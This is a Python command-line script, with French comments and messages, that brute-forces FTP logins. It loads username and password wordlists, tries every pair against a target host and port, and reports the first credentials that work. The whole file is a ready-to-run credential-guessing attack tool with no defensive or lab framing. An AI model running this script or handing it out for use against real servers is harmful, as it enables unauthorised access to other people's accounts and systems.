import ftplib
import argparse

def bruteforce_ftp(host, user_file, pass_file, port=21):
    print(f"🔍 Brute-force FTP en cours sur {host}:{port}...\n")

    # Lecture des fichiers
    try:
        with open(user_file, "r") as uf:
            usernames = [u.strip() for u in uf if u.strip()]
        with open(pass_file, "r") as pf:
            passwords = [p.strip() for p in pf if p.strip()]
    except FileNotFoundError as e:
        print(f"❌ Fichier introuvable : {e}")
        return

    # Boucle brute-force
    for username in usernames:
        for password in passwords:
            try:
                print(f"🔐 Tentative : {username}/{password}")
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=5)
                ftp.login(username, password)
                print(f"\n✅ Succès ! Identifiants valides : {username}/{password}")
                ftp.quit()
                return
            except ftplib.error_perm:
                # Mauvais identifiants
                pass
            except Exception as e:
                print(f"⚠️ Erreur de connexion : {e}")
    print("\n❌ Aucun identifiant valide trouvé.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute-force FTP avec Python")
    parser.add_argument("-c", "--cible", required=True, help="Adresse IP ou domaine de la cible")
    parser.add_argument("-l", "--logins", required=True, help="Fichier de logins")
    parser.add_argument("-p", "--passwords", required=True, help="Fichier de mots de passe")
    parser.add_argument("--port", type=int, default=21, help="Port FTP (par défaut : 21)")

    args = parser.parse_args()
    bruteforce_ftp(args.cible, args.logins, args.passwords, args.port)
